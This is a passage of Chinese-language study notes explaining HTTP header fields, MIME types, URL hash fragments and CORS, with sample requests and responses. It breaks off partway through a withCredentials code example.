Connection\nConnection 他有两个作用\n1. 作用1：控制不再转发给代理的首部字段\n```\nGET / HTTP/1.1\nUpgrade: HTTP/1.1    // 就会把次字段删除后再从代理服务器转发出去\nConnection: Upgrade   // 不再转发的首部字段名\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125420.png)\n\n2. 作用2：管理持久链接（这个比较常见）\n下方这个响应报文头中的Connection就是用来管理持久连接的，其参数为keep-alive，就是保持持久连接的意思。可以使用close参数将其关闭。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125429.png)\n\n\n#### Transfer-Encoding\n该字段表示报文在传输过程中采用的编码方式，在HTTP/1.1的报文传输过程中仅对分块编码有效。下方这个截图就是Transfer-Encoding在Response Header中的使用，后边根的chunked(分块)的参数，说明报文是分块进行传输的。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125438.png)\n\n#### Via\n该字段是为了追踪请求和响应报文测传输路径，报文经过代理或者网关是会在Via字段添加该服务器的信息，然后再进行转发。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125446.png)\n\n#### Pragme\nPragme是HTTP/1.1之前版本遗留的字段，仅仅是为了与HTTP/1.0向后兼容而定义\n\n例如`Pragme：no-cache`:表示所有的中间服务器不返回缓存的资源\n可是如果所有的中间服务器都以HTTP/1.1为基准的话，可以直接采用 Cache-Control：no-cache\n所以一般会发送两个字段`Cache-Control：no-cache`, `Pragme：no-cache`\n\n### 请求报头字段\n顾名思义，请求报头字段当然是在请求头中才使用的字段(共19种)。该字段用于补充请求的附加信息，客户端信息等。\n| 首部字段            | 解释                                          |\n| ------------------- | --------------------------------------------- |\n| Accept              | 客户端希望接收的媒体类型                      |\n| Accept-Charset      | 优先的字符集                                  |\n| Accept-Encoding     | 优先的内容编码                                |\n| Accept-Language     | 优先的语言（自然语言）                        |\n| Authorization       | web认证信息                                   |\n| Expect              | 期待服务器的特定行为                          |\n| From                | 用户的电子邮箱地址                            |\n| Host                | 请求资源所在服务器                            |\n| If-Match            | 比较实体标记（ETag）                          |\n| If-Modified-since   | 比较资源的更新时间                            |\n| If-None-Match       | 比较实体标记（与If-Match相反）                |\n| If-Range            | 资源未更新时发送实体Byte的范围请求            |\n| If-Unmodified-Since | 比较资源的更新时间（与If-Modified-since相反） |\n| Max-Forwards        | 最大传输逐跳数                                |\n| Proxy-Authorization | 代理服务器要求客户端的认证信息                |\n| Range               | 实体的字节范围要求                            |\n| Referer             | 对请求中URI的原始获取方                       |\n| TE                  | 传输编码的优先级                              |\n| User-Agent          | HTTP客户端程序的信息                          |\n\n#### Accept\n该字段首部列举了浏览器希望接收的媒体资源的 MIME 类型。其中不同的 MIME 类型之间用逗号分隔，同时每一种 MIME 类型会配有一个品质因数（quality factor），该参数明确了不同 MIME 类型之间的相对优先级\n\n**语法**\n```\nAccept: <MIME_type>/<MIME_subtype>\nAccept: <MIME_type>/*\nAccept: */*\n\n// Multiple types, weighted with the quality value syntax:\nAccept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\n```\n\n**指令**\n- `<MIME_type>/<MIME_subtype>`: 单一精确的 MIME 类型, 例如text/html.\n- `<MIME_type>/*`: 一类 MIME 类型, 但是没有指明子类。 `image/*` 可以用来指代 image/png, image/svg, image/gif 以及任何其他的图片类型。\n- `*/*`: 任意类型的 MIME 类型\n- `;q= (q因子权重)`: 值代表优先顺序，用相对质量价值表示，又称作权重。\n\n**示例**\n```\nAccept: text/html\n\nAccept: image/*\n\nAccept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\n```\n\n#### Accept-Encoding\n该字段用来告知服务器，客户端这边可支持的内容编码以及相应内容编码的优先级, 下方就是Accept-Encoding的用法。gzip表示由文件压缩程序gzip(GNU zip)生成的编码格式。compress表示UNIX文件压缩程序compress生成的编码格式。deflate表示组合使用zlib格式以及有deflate压缩算法生成的编码格式。identity表示不执行压缩或者使用一致的默认编码格式。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125454.png)\n\n#### Accept-Language\n该字段用来告知服务器，客户端可处理的自然语言集，以及对应语言集的优先级。以下方的截图为例，Accept-Language后方跟了三个属性，分别是“zh-CN”, \"zh;q=0.8\"，“en;q=0.6”。也就是说客户端可处理三种自然预言集，zh-CN，其优先级是1（最高）。第二种是zh ，其优先级是0.8，次之。第三个是en，优先级为0.6，优先级在三者之间最低。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125517.png)\n\n#### Authorization\n用来告知服务器，客户端的认证信息，下方就是连接公司内部SVN系统时需要认证时的请求头部信息。\n如果你没有填写认证信息的话，那么就会返回401 Unauthorized。如下所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125527.png)\n\n#### If-Match 与If-None-Match\n上面这两个请求头部字段都是带有逻辑判断的，从上面的英文我们不难看出两者恰好相反。两者后方都跟着串字符串，如If-Match \"xcsldjh49773hce\", 后边这个字符的匹配对象是ETag(稍后会介绍)。If-Match的请求是如果后方的字符串与ETag相等则服务器端进行请求，否则不进行处理。If-None-Match是If-Match的非操作，同样是匹配ETag, 如果Etag没有匹配成功就处理请求，否则不处理。\n\n#### If-Modified-Since与If-Unmodified-Since\nIf-Modified-Since也是带有逻辑判断的请求头部字段，该字段后方跟的是一个日期，意思是在该日期后发生了资源更新，那么服务器就会处理该请求。If-Unmodified-Since就是 If-Modified-Since的非操作。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125535.png)\n\n\n#### If-Range\nif-Range字段后方也是跟的Etag, 该字段要结合着Range字段进行使用。其所代表的意思就是如果Etag匹配成功，请求的内容就按照Range字段所规定的范围进行返回，否则返回全部的内容。用法如下所示：\n```\nIf-Range: \"etag_code\" \nRange: bytes=1000-5000\n```\n\n#### Referer\n其实Referer是一个错误的拼写，但是一直在使用。正确的英文单词应该是Referrer(此处可翻译为:来历、来路)。Referer字段后方跟的是一个URI, 该URI就是发起请求的URI，具体如下所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125544.png)\n\n#### User-Agent\n该字段会将请求方的浏览器和用户代理名称等信息传达给服务器。下方就是从我当前笔记本的Chrome浏览器请求网络时的User-Agent信息\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125556.png)\n\n### 响应报头字段\n聊完请求报文头部字段后，我们接下来来聊一下响应报文头部字段(共9种)。响应头是由Server向Client返回响应报文中使用的头部信息。用户补充响应的附加信息、服务信息等。\n| 首部字段名         | 解释                         |\n| ------------------ | ---------------------------- |\n| Accept-Ranges      | 是否接受字节范围请求         |\n| Age                | 推算资源创建经过时间         |\n| ETag               | 资源的匹配信息               |\n| Location           | 令客户端重定向至指定URI      |\n| Proxy-Authenticate | 代理服务器对客户端的认证信息 |\n| Retry-After        | 对再次发起请求的时机要求     |\n| Server             | HTTP服务器的安装信息         |\n| Vary               | 代理服务器缓存的管理信息     |\n| WWW-Authenticate   | 服务器对客户端的认证信息     |\n\n#### Accept-Ranges\n该字段用来告知客户端服务器那边是否支持范围请求（请求部分内容，请求头中使用Range字段）。Accept-Ranges的值为bytes时，就说明服务器支持范围请求，为none时，说明服务器不支持客户端的范围请求。下方是博客园的页面的加载，从下方可以看出是支持范围请求的，如下所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125634.png)\n\n#### Age\n该字段告知客户端，源服务器在多久前创建了该响应。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125608.png)\n\n#### Etag\nEtag是服务器当前请求的服务器资源（图片，HTML页面等）所对应的一个独有的字符串。不同资源间的Etag是不同的，当资源更新时Etag也会进行更新, 并没有统一的算法规则，而是由服务器来分配\n所以结合着请求头中的If-Match等逻辑请求头，可以判断当前Client端已经加载的资源在服务器端是否已经更新了。当初次请求一个资源，如图片时，我们可以将其Etag进行保存，在此请求时，可放在If-None-Match后方，进行资源更新。如果服务器资源并未修改，就不对该请求做出响应。下方就是网页中某张图片对应着的Etag，如下所示。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125619.png)\n\n#### Location\nLocation字段一般与重定向结合着使用。下方是我访问“www.baidu.com/hello”这个连接的响应报文。因为服务器上并没有/hello这个资源路径，所以给我重定向了error.html页面，这个重定向的URL就存储在Location字段中，如下所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125643.png)\n\n#### Server\n该响应字段表明了服务器端使用的服务器型号，下方是博客园某张图片的响应头，使用的Web服务器是Tengine, Tengin是淘宝发起的Web服务器项目，是基于Nginx的，关于Tengin的相关内容，请自行Google吧。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125652.png)\n\n#### Vary \nVary 首部字段vary可对缓存进行控制，源服务器会向代理服务器传达关于本地缓存使用方法的命令\n当代理服务器接收到服务器返回包含Vary指定项的响应后，仅对请求中含有相同Vary指定首部字段的请求返回缓存\n即使对相同资源发起请求，但是由于Vary指定的首部字段不相同，因此必须从源服务器重新获取资源\n下方就是Vary的使用，Vary后方的参数是Accept-Encoding。其意思是返回的缓存要以Accept-Encoding为准。当请求的Accept-Encoding的参数与缓存内容的Accept-Encoding参数一致时就返回缓存内容，否则就请求源服务器。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125700.png)\n\n再例如下面这个，如果使用的Accept-Language：en-us字段的值相同，那么直接从缓存返回响应，否则从源服务器请求资源后再返回响应\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125710.png)\n\n\n#### WWW-Authenticate\n该字段用于HTTP的访问认证，在状态码401 Unauthorized中肯定带有此字段，该字段用来指定客户端的认证方案（Basic或者Digest）。参数realm的字符串是为了辨别请求URL指定资源所受到的保护策略。如下所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125722.png)\n\n### 实体报头字段\n实体报头字段(共10种)是报文实体所使用的头部，用来补充与报文实体相关的信息。\n| 首部字段名       | 解释                           |\n| ---------------- | ------------------------------ |\n| Allow            | 资源可支持的HTTP方法           |\n| Content-Encoding | 实体主体适用的编码方式         |\n| Content-Language | 实体主体的自然语言             |\n| Content-Length   | 实体主体的大小（单位：字节）   |\n| Content-Location | 代替对应资源的URI              |\n| Content-MD5      | 实体主体的报文摘要             |\n| Content-Range    | 实体主体的位置范围             |\n| Content-Type     | 实体主体的媒体类型             |\n| Expires          | 实体主体过期的日期时间         |\n| Last-Modified    | 资源的最后修改最期时间）不要加 |\n\n#### Allow\n该字段用于服务器通知客户端服务器这边所支持的所有请求方法（GET、POST等）。如果服务器找不到客户端请求中所提到的方法的话，就会返回405 Method Not Allowed，于此同时还会把所有能支持的HTTP方法写入到首部字段Allow后返回。\n```\nAllow : GET, POST, HEAD, PUT, DELETE \n```\n\n#### content-type\nContent-Type 实体头部用于指示资源的MIME类型[media type](#mediaType)。\n\n- **在响应中**，Content-Type标头告诉客户端实际返回的内容的内容类型\n- **在请求中 (如POST 或 PUT)**，客户端告诉服务器实际发送的数据类型。\n\n**句法**\n```\nContent-Type: text/html; charset=utf-8\nContent-Type: multipart/form-data; boundary=something\n```\n\n**指令**\n- `media-type`:资源或数据的[MIME type](#mediaType)。\n- `charset`: 字符编码标准。\n- `boundary`：对于多部分实体，boundary 是必需的，其包括来自一组字符的1到70个字符，已知通过电子邮件网关是非常健壮的，而不是以空白结尾。它用于封装消息的多个部分的边界。\n\n\n**例子**\nContent-Type 在HTML表单中\n在通过HTML form提交生成的POST请求中，请求头的Content-Type由`<form>`元素上的enctype属性指定\n```html\n<form action=\"/\" method=\"post\" enctype=\"multipart/form-data\">\n  <input type=\"text\" name=\"description\" value=\"some text\">\n  <input type=\"file\" name=\"myFile\">\n  <button type=\"submit\">Submit</button>\n</form>\n```\n请求头看起来像这样（在这里省略了一些 headers）：\n```\nPOST /foo HTTP/1.1\nContent-Length: 68137\nContent-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575\n\n---------------------------974767299852498929531610575\nContent-Disposition: form-data; name=\"description\"\n\nsome text\n---------------------------974767299852498929531610575\nContent-Disposition: form-data; name=\"myFile\"; filename=\"foo.txt\"\nContent-Type: text/plain\n\n(content of the uploaded file foo.txt)\n---------------------------974767299852498929531610575\n```\n\n#### Content-Encoding\n该字段用来说明报文实体的编码方式，下方这段报文头中的Content-Encoding的参数为gzip，说明是使用gzip对报文实体进行压缩的。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125732.png)\n\n####  Content-Language\n该字段表示报文实体使用的自然语言，使用方式如下所示：\n```\nContent-Language: zh-CN\n```\n\n#### Content-Length\n顾名思义，该字段用来指定报文实体的字节长度，如下所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125742.png)\n\n#### Content-MD5\n该字段中存储的是报文实体进行MD5加密然后再使用Base64进行编码的字符串。客户端收到响应报文后，可以对报文实体进行MD5加密，然后再对其进行Base64编码，然后与Content-MD5中的字符串进行比较来确定报文是否进行修改，可以说这是一个简单的验签功能。但是此方法并不能确定报文是否被修改了，因为Content-MD5这个值也有可能被篡改。\n\n### 其他报头字段\n#### Set-Cookie\n因为HTTP协议本身是无状态的，在Web站点中使用Cookie来管理服务器与客户端之间的状态。\n\n响应报文中会使用到该字段。当服务器准备开始管理客户端的状态时，会事先告知其各种信息。\n| 属性           | 解释                                                                                                                   |\n| -------------- | ---------------------------------------------------------------------------------------------------------------------- |\n| NAME=VALUE     | 赋予Cookie的名称和其值（必需项）                                                                                       |\n| expires = DATE | cookie的有效期（若不指定则默认为浏览器关闭为止）                                                                       |\n| path=PATH      | 将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录）                                         |\n| domin=域名     | 作为cookie适用对象的域名（若不指定则默认为创建Cookie的服务器域名）                                                     |\n| Secure         | 仅在HTTPS安全通信时才会发送Cookie                                                                                      |\n| HttpOnly       | 加以限制，使cookie不能被Js脚本访问，主要目的是为了防止跨站脚本攻击（Cross Httponly site Scripting，XSS）对cookie的窃取 |\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125753.png)\n\n**谷歌浏览器控制台查看cookie**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125802.png)\n\ncookie中的thor和JSESSIONID这两个key的后HttpOnly属性被打上了√，就表明，此key无法被js脚本访问，防止跨站脚本攻击（Cross Site Scripting，XSS）对cookie的窃取 我们来看下再console控制台输入document.cookie 得出的cookie无法找到这两个key\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125811.png)\n\n因为这个属性JSESSIONID比较重要，存储的是sessionId，这个要是被别人拿到的话，别人就可以冒充我在网站上做某些事情了，像我自己一样请求某些数据了\n\n#### Cookie\n请求报文头中会使用该字段，用于将本地存储的Cookie信息发送给服务端。\n\n#### Content-disposition\n在常规的 HTTP 应答中，Content-Disposition 响应头指示回复的内容该以何种形式展示，是以内联的形式（即网页或者页面的一部分），还是以附件的形式下载并保存到本地。\n在 multipart/form-data 类型的应答消息体中，Content-Disposition 消息头可以被用在 multipart 消息体的子部分中，用来给出其对应字段的相关信息。各个子部分由在Content-Type 中定义的分隔符分隔。用在消息体自身则无实际意义。\n\n**语法**\n**1. 作为消息主体中的消息头**\n在 HTTP 场景中，第一个参数或者是 inline（默认值，表示回复中的消息体会以页面的一部分或者整个页面的形式展示），或者是 attachment（意味着消息体应该被下载到本地；大多数浏览器会呈现一个“保存为”的对话框，将 filename 的值预填为下载后的文件名，假如它存在的话）。\n```\nContent-Disposition: inline\nContent-Disposition: attachment\nContent-Disposition: attachment; filename=\"filename.jpg\"\n```\n\n**2. 作为multipart body中的消息头**\n在 HTTP 场景中。第一个参数总是固定不变的 form-data；附加的参数不区分大小写，并且拥有参数值，参数名与参数值用等号('=')连接，参数值用双引号括起来。参数之间用分号(';')分隔。\n```\nContent-Disposition: form-data\nContent-Disposition: form-data; name=\"fieldName\"\nContent-Disposition: form-data; name=\"fieldName\"; filename=\"filename.jpg\"\n```\n\n**指令**\n- `name`: 后面是一个表单字段名的字符串，每一个字段名会对应一个子部分。在同一个字段名对应多个文件的情况下（例如，带有 multiple 属性的`<input type=file>`元素），则多个子部分共用同一个字段名。如果 name 参数的值为 `_charset_` ，意味着这个子部分表示的不是一个 HTML 字段，而是在未明确指定字符集信息的情况下各部分使用的默认字符集。\n- `filename`: 后面是要传送的文件的初始名称的字符串。这个参数总是可选的，而且不能盲目使用：路径信息必须舍掉，同时要进行一定的转换以符合服务器文件系统规则。这个参数主要用来提供展示性信息。当与 Content-Disposition: attachment 一同使用的时候，它被用作\"保存为\"对话框中呈现给用户的默认文件名。\n- `filename*`: \"filename\" 和 \"filename*\" 两个参数的唯一区别在于，\"filename*\" 采用了  RFC 5987 中规定的编码方式。当 \"filename\" 和 \"filename*\" 同时出现的时候，应该优先采用 \"filename*\"，假如二者都支持的话。\n\n**示例**\n以下是一则可以触发\"保存为\"对话框的服务器应答：\n```\n200 OK\nContent-Type: text/html; charset=utf-8\nContent-Disposition: attachment; filename=\"cool.html\"\nContent-Length: 22\n\n<HTML>Save me!</HTML>\n```\n\n这个简单的 HTML 文件会被下载到本地而不是在浏览器中展示。大多数浏览器默认会建议将 cool.html 作为文件名。\n\n以下是一个HTML表单的示例，展示了在 multipart/form-data 格式的报文中使用Content-Disposition 消息头的情况：\n```\nPOST /test.html HTTP/1.1\nHost: example.org\nContent-Type: multipart/form-data;boundary=\"boundary\"\n\n--boundary\nContent-Disposition: form-data; name=\"field1\"\n\nvalue1\n--boundary\nContent-Disposition: form-data; name=\"field2\"; filename=\"example.txt\"\n\nvalue2\n--boundary--\n```\n\n## MIME类型\n媒体类型（通常称为 Multipurpose Internet Mail Extensions 或 MIME 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。它在IETF RFC 6838中进行了定义和标准化。\n\n>重要：浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理URL，因此Web服务器在响应头中添加正确的MIME类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。\n\n### 语法\n**通用结构**\n```\ntype/subtype\n```\nMIME的组成结构非常简单；由类型与子类型两个字符串中间用'/'分隔而组成。不允许空格存在。type 表示可以被分多个子类的独立类别。subtype 表示细分后的每个类型。\n\nMIME类型对大小写不敏感，但是传统写法都是小写。\n\n### 独立类型\n```\ntext/plain\ntext/html\nimage/jpeg\nimage/png\naudio/mpeg\naudio/ogg\naudio/*\nvideo/mp4\napplication/*\napplication/json\napplication/javascript\napplication/ecmascript\napplication/octet-stream\n…\n```\n\n独立类型表明了对文件的分类，可以是如下之一：\n| 类型        | 描述                                                                                                                                                                 | 典型示例 |\n| ----------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- |\n| text        | 表明文件是普通文本，理论上是人类可读\ttext/plain, text/html, text/css, text/javascript                                                                                |\n| image       | 表明是某种图像。不包括视频，但是动态图（比如动态gif）也使用image类型\timage/gif, image/png, image/jpeg, image/bmp, image/webp, image/x-icon, image/vnd.microsoft.icon |\n| audio       | 表明是某种音频文件\taudio/midi, audio/mpeg, audio/webm, audio/ogg, audio/wav                                                                                          |\n| video       | 表明是某种视频文件\tvideo/webm, video/ogg                                                                                                                             |\n| application | 表明是某种二进制数据\tapplication/octet-stream, application/pkcs12, application/vnd.mspowerpoint, application/xhtml+xml, application/xml,  application/pdf            |\n\n对于text文件类型若没有特定的subtype，就使用 text/plain。类似的，二进制文件没有特定或已知的 subtype，即使用 application/octet-stream。\n\n### Multipart 类型\n```\nmultipart/form-data\nmultipart/byteranges\n```\nMultipart 类型表示细分领域的文件类型的种类，经常对应不同的 MIME 类型。这是复合文件的一种表现方式。multipart/form-data 可用于联系 HTML Forms 和 POST 方法，此外 multipart/byteranges使用状态码206 Partial Content来发送整个文件的子集，而HTTP对不能处理的复合文件使用特殊的方式：将信息直接传送给浏览器（这时可能会建立一个“另存为”窗口，但是却不知道如何去显示内联文件。）\n\n\n### 两种主要的MIME类型\n#### application/octet-stream\n这是**应用程序文件的默认值**。意思是未知的应用程序文件 ，响应体的形式为文件流，浏览器一般不会自动执行或询问执行。 前端获取到响应体中的文件流后可用对其进行一些操作，比如下载等\n\n有关具体过程，可以到js笔记中看`前端下载文件方式`\n\n\n#### text/plain\n**文本文件默认值**。即使它意味着未知的文本文件，但浏览器认为是可以直接展示的。\n\ntext/plain并不是意味着某种文本数据。如果浏览器想要一个文本文件的明确类型，浏览器并不会考虑他们是否匹配。比如说，如果通过一个表明是下载CSS文件的`<link>`链接下载了一个 text/plain 文件。如果提供的信息是text/plain，浏览器并不会认出这是有效的CSS文件。CSS类型需要使用text/css。\n\n## Accept与Content-Type的区别\n1. 类型不同\nAccept属于请求报头中的字段， Content-Type属于实体报头中的字段。\n2. 作用不同\nAccept代表发送端（客户端）希望接受的数据类型。 比如：Accept：text/xml; 代表客户端希望接受的数据类型是xml类型。\nContent-Type代表发送端（客户端|服务器）发送的实体数据的数据类型。 比如：Content-Type：text/html; 代表发送端发送的数据格式是html。\n\n二者合起来，例如请求报头中为`Accept:text/xml； Content-Type:text/html`，即代表希望接受的数据类型是xml格式，本次请求发送的数据的数据格式是html。\n\n**如果服务器响应的content-type值不在浏览器请求的Accept中，则响应失败**\n\n# URL中的hash(#号)\n**#的含义**\n#代表网页中的一个位置，其右边的字符，就是该位置的标识符，比如：\n```\nhttp://example.com/index.html#print\n```\n就是代表index.html中的print位置，浏览器会自动把print位置滚动到页面可视区域内\n\n**http请求不包含#**\n#号用来指导浏览器动作的，对服务器端完全无用，所以，http请求中不包含#\n比如，访问下面的网址：\n```\nhttp://jquery.com#hello\n```\n浏览器实际发出的请求是这样的：\n```\nRequest URL: http://jquery.com/\nRequest Method: GET\n```\n可以看到，只是请求了http://jquery.com，没有请求\"#hello\"的部分\n\n**#后面的字符**\n在第一个#后面出现的任何字符，都会被浏览器解读为位置标识符，这意味着，这些字符都不会被发送到服务器端。比如，下面的url的意愿是指定一个颜色值：\n```\nhttp://jquery.com/?color=#fff\n```\n但浏览器实际发送的请求是：\n```\nRequest URL: http://jquery.com/?color=\nRequest Method: GET\n```\n可以看到，\"#fff\"被忽略掉了，只有将#转码为%23，浏览器才会将其作为实义字符处理，也就是说，上面的网站应该被写成：`http://jquery.com/?color=%23fff`\n\n**改变#后的内容不触发网页重载**\n单单改变#后的内容，浏览器只会滚动到相应位置，不会重新加载网页\n浏览器不会重新向服务器请求页面\n\n**改变#会改变浏览器的访问历史**\n每一次改变#后的部分，都会在浏览器的访问历史中增加一个记录，使用回退按钮，就可以回到上一个位置\n这对于ajax应用程序特别有用，可以用不同的#值，表示不同的访问状态，然后让用户给出可以访问某个状态的链接\n值得注意的是，上述规则对IE 6和IE 7不成立，它们不会因为#的改变而增加历史记录\n \n**window.location.hash读取#值**\n`window.location.hash`这个属性可读可写，读取时，可以用来判断网页状态是否改变，写入时，则会在不重载网页的前提下，创造一条访问历史记录\n\n**onhashchange事件**\n这是一个HTML5新增的事件，当#值发送变化时，就会触发这个事件，IE8+,Firefox 3.6+,chrome 5+支持该事件，它的使用方法有三种：\n- `window.onhashchange=func`\n- `<body onhashchange=\"func()\">`\n- `window.addEventListener(\"hashchange\", func, false)`\n\n**Google抓取#的机制**\n默认情况下，Google的网络蜘蛛会忽略URL的#部分\n但是，Google还规定，如果你希望Ajax生成内容被浏览器引擎读取，那么url中可以使用`#!`, Google会自动将后面的内容转成查询字符串`_escaped_fragment_`的值\n比如：Google发现新版twitter的url如下\n```\nhttp://twitter.com/#!/username\n```\n就会自动抓取另一个url:\n```\nhttp://twitter.com/?_escaped_fragment_=/username\n```\n通过这种机制，Google就可以索引动态的ajax内容\n\n# mediaType\n> media type规范官网：https://www.iana.org/assignments/media-types/media-types.xhtml\n\nInternet Media Type，即互联网媒体类型，也叫做于MIME类型，它使用两部分标识符来确定一个类型。\n\nMIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。\n\n## 常见的mediaType\n常见的媒体格式类型如下：\n- text/html ： HTML格式\n- text/plain ：纯文本格式\n- text/xml ： XML格式\n- image/gif ：gif图片格式\n- image/jpeg ：jpg图片格式\n- image/png：png图片格式\n\n以application开头的媒体格式类型：\n- application/xhtml+xml ：XHTML格式\n- application/xml： XML数据格式\n- application/atom+xml ：Atom XML聚合格式\n- application/json： JSON数据格式\n- application/pdf：pdf格式\n- application/msword ： Word文档格式\n-application/octet-stream ： 二进制流数据（如常见的文件下载）\n- application/x-www-form-urlencoded ：`<form encType=\"\">`中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式）\n\n另外一种常见的媒体格式是上传文件之时使用的：\n- multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式\n\n# 跨域\n## 为什么会出现跨域问题\n出于浏览器的同源策略限制。同源策略（Sameoriginpolicy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。同源策略会阻止一个域的javascript脚本和另外一个域的内容进行交互。所谓同源（即指在同一个域）就是两个页面具有相同的协议（protocol），主机（host）和端口号（port）\n\n<font color=\"red\">跨域问题是在浏览器上的，即只有浏览器访问一个资源时，才会发生跨域问题。\n当一个服务器不是通过浏览器来访问另一个服务器资源时，是不会发生跨域问题的。</font>\n\n## 解决跨域问题\n### CORS\n这是最常用的方法。\nCORS 是跨域资源分享（Cross-Origin Resource Sharing）的缩写。它是 W3C 标准，属于跨源 AJAX 请求的根本解决方法。\n- 普通跨域请求：只需服务器端设置Access-Control-Allow-Origin\n- 带cookie跨域请求：前后端都需要进行设置\n\n# CORS\nCORS是一个W3C标准，全称是\"跨域资源共享\"（Cross-origin resource sharing）。\n它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。\n## 简介\nCORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。\n\n整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。\n\n因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。\n\n## 两种请求\n浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。\n\n只要同时满足以下两大条件，就属于简单请求。\n\n1. 请求方法是以下三种方法之一：\n- HEAD\n- GET\n- POST\n\n2. HTTP请求头中只允许下面字段被修改或被设置\n- Accept\n- Accept-Language\n- Content-Language\n- Last-Event-ID\n- Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain\n\n凡是不同时满足上面两个条件，就属于非简单请求。\n\n浏览器对这两种请求的处理，是不一样的。\n\n### 简单请求\n#### 基本流程\n对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。\n\n下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段。\n```\nGET /cors HTTP/1.1\nOrigin: http://api.bob.com\nHost: api.alice.com\nAccept-Language: en-US\nConnection: keep-alive\nUser-Agent: Mozilla/5.0...\n```\n上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。\n\n如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。\n\n如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。\n```\nAccess-Control-Allow-Origin: http://api.bob.com\nAccess-Control-Allow-Credentials: true\nAccess-Control-Expose-Headers: FooBar\nContent-Type: text/html; charset=utf-8\n```\n上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。\n\n**1. Access-Control-Allow-Origin**\n该项控制数据的可见范围，如果希望数据对任何人都可见，可以填写`\"*\"`\n\n**2. Access-Control-Allow-Credentials**\n该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可，而不是填写false\n\n**3. Access-Control-Expose-Headers**\n该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，例如Cookie, 就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader('FooBar')可以返回FooBar字段的值。\n\n\n#### withCredentials 属性\n> - 不跨域的时候，HTTP 携带 cookie 是协议里规定的，换言之，你不需要主动操作\n> - 跨域的时候，如果服务器包含 CORS 头，那么 withCredentials=true 可以携带 cookie。\n\n上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。\n```\nAccess-Control-Allow-Credentials: true\n```\n另一方面，开发者必须在AJAX请求中打开withCredentials属性。\n```\nvar xhr = new XMLHttpRequest();\nxhr.withCredentials = true;\n```\n否则如果withCredentials的值为false时，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。\n\n但是，如果省略withCredentials设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭withCredentials。\n```\nxhr.withCredentials = 